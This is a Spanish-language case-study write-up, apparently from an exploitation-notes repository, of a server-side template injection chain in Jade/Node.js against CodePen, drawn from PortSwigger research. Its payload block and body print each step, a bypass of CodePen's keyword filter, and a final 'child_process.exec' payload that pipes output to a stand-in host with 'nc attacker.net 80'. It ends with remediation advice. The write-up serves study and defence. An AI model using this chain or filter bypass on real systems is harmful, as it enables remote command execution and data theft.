---
clase: inyeccion
tech: jade-nodejs
cwe: CWE-1336
cvss: 9.8 # [derivado] RCE; corregido segun la fuente
payload: |
  # CADENA COMPLETA - LITERALES de la fuente, en orden de descubrimiento.
  # ADVERTENCIA (H1): el render colapso los saltos de linea de cada bloque.
  #
  # 1) Reconocimiento:
  = 7*7        ->  49
  = root       ->  [object global]
  #
  # 2) Enumerar propiedades del objeto global:
  - var x = root   - for(var prop in x)       , #{prop}
  # Salida (el '...' es de la fuente):
  #   , ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, root
  #
  # 3) Enumerar 'process':
  - var x = root.process   - for(var prop in x)       , #{prop}
  #   , title, version, moduleLoadList... mainModule, setMaxListeners, emit, once
  #
  # 4) FORMA BLOQUEADA por el filtro de CodePen:
  - var x = root.process.mainModule   - for(var prop in x)       , #{prop}
  # Respuesta LITERAL de CodePen:
  #   CodePen removed the words below from your Jade because they could be used to do
  #   bad things. Please remove them and try again.
  # Palabras bloqueadas: ->process  y  ->mainModule
  #
  # 5) BYPASS - trocear el acceso en dos pasos para que la cadena prohibida
  #    'process.mainModule' nunca aparezca junta:
  - var x = root.process   - x = x.mainModule   - for(var prop in x)       , #{prop}
  # Salida: , id, exports, parent, filename, loaded, children, paths, load, require, _compile
  #
  # 6) Confirmar que 'require' es alcanzable:
  - var x = root.process   - x = x.mainModule.require   - x('a')
  #   -> Cannot find module 'a'      (el error confirma que require() se ejecuta)
  #
  # 7) EXPLOIT FINAL:
  - var x = root.process   - x = x.mainModule.require   - x = x('child_process')   = x.exec('id | nc attacker.net 80')
precondicion: "SSTI confirmada en Jade sobre Node.js. El objeto 'root' debe ser alcanzable desde la plantilla (lo es por defecto: '= root' devuelve [object global]). El bypass del paso 5 solo hace falta si existe un filtro de palabras como el de CodePen."
como_se_descubre: |
  Es el ejemplo mas instructivo de la metodologia 'Explore' de la fuente, porque cada
  paso se deduce del anterior en lugar de probarse a ciegas:
  '= root' devuelve el objeto global -> enumerar sus propiedades revela 'process' ->
  enumerar process revela 'mainModule' -> mainModule tiene 'require' -> require da
  acceso a 'child_process' -> child_process tiene exec().
  Ningun paso requiere adivinar: cada uno se lee de la salida del anterior. Es la
  diferencia entre explotacion y fuerza bruta de payloads.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: - var x = root.process   - x = x.mainModule.require   - x('a')
  #    -> 'Cannot find module a' = require() SE EJECUTA
  # B: - var x = root.process   - x = x.mainModule.require   - x('fs')
  #    -> sin error = el modulo existe y se cargo
  # El par A/B es el mejor control de esta cadena: el ERROR de A es la prueba positiva.
  # Un mensaje 'Cannot find module' demuestra que se llamo a require con el argumento
  # controlado, que es exactamente lo que hace falta saber antes del paso final.
mata: |
  - El objeto 'root' no es alcanzable desde la plantilla.
  - Filtro que normalice o bloquee el acceso troceado (el de CodePen no lo hacia).
  - CodePen ya lo corrigio ('Fixed' segun la fuente).
  - 'require' no esta en mainModule (entorno Node no estandar o bundle sin require).
fuente: "https://portswigger.net/research/server-side-template-injection (James Kettle, 2015-08-05, act. 2025-09-03). Todos los pasos, salidas y el mensaje de CodePen literales de la pagina. Estado del caso CodePen segun la fuente: 'Fixed'. Sin CVE ni recompensa indicados. Los '...' dentro de las salidas son truncamientos de la propia fuente."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] SSTI en Jade/Node.js — de `= root` a `child_process.exec` en siete pasos (CodePen)

## Principio
Una plantilla de Jade ejecuta JavaScript en Node. Si el objeto global es alcanzable,
todo el entorno de Node lo es — y Node incluye `require`, que incluye `child_process`,
que incluye `exec`. La cadena no necesita ningún truco: solo recorrer el grafo de
objetos leyendo lo que cada paso devuelve.

## La cadena
```
= root
```
→ `[object global]`

Enumerar sus propiedades:
```
- var x = root   - for(var prop in x)       , #{prop}
```
→ `, ArrayBuffer, Int8Array, ... global, process, GLOBAL, root`

Enumerar `process`:
```
- var x = root.process   - for(var prop in x)       , #{prop}
```
→ `, title, version, moduleLoadList... mainModule, setMaxListeners, emit, once`

Confirmar que `require` se ejecuta:
```
- var x = root.process   - x = x.mainModule.require   - x('a')
```
→ `Cannot find module 'a'`

Y el exploit:
```
- var x = root.process   - x = x.mainModule.require   - x = x('child_process')   = x.exec('id | nc attacker.net 80')
```

## El bypass del filtro de CodePen
CodePen bloqueaba la forma directa:

```
- var x = root.process.mainModule   - for(var prop in x)       , #{prop}
```

con esta respuesta literal:

> CodePen removed the words below from your Jade because they could be used to do bad
> things. Please remove them and try again.

Las palabras bloqueadas eran `->process` y `->mainModule`. El bypass consiste en
**trocear el acceso en dos sentencias**, de modo que la cadena prohibida
`process.mainModule` nunca aparezca junta:

```
- var x = root.process   - x = x.mainModule   - for(var prop in x)       , #{prop}
```

Es el mismo fallo que aparece en media docena de writeups de este repo: un filtro que
compara **texto** frente a un motor que ejecuta **gramática**. El filtro no estaba mal
escrito; estaba operando sobre la representación equivocada.

## El error como prueba positiva
`Cannot find module 'a'` es el mejor control negativo de toda la cadena. Un mensaje de
error que nombra el módulo que se pidió demuestra que `require()` se ejecutó con el
argumento controlado — que es exactamente lo que hay que saber antes del paso final. Es
un recordatorio de que en explotación un error informativo suele valer más que un éxito
silencioso.

## Por qué esta cadena merece estudiarse
Cada paso se **deduce** de la salida del anterior: `root` → `process` → `mainModule` →
`require` → `child_process` → `exec`. No hay adivinanza en ningún punto. Es la
materialización de la fase `Explore` que la fuente recomienda, y el contraste con lanzar
payloads de una lista es exactamente la diferencia que el principio 1 de
`docs/ELITE-MINDSET.md` llama metodología.

## Impacto
Ejecución remota de comandos con exfiltración (`| nc attacker.net 80`). Estado del caso
según la fuente: **corregido**.

## Remediación
Del paper: los regex no son defensa efectiva y los sandboxes a nivel de parser son
propensos a error; el enfoque de menor riesgo es un motor trivial como Mustache. Para
entornos donde se acepten plantillas de usuario, la fuente propone el modelo de
MediaWiki —un entorno Lua sandboxeado con los módulos peligrosos eliminados— y, como
complemento, ejecutar el entorno de plantillas en un contenedor restringido.
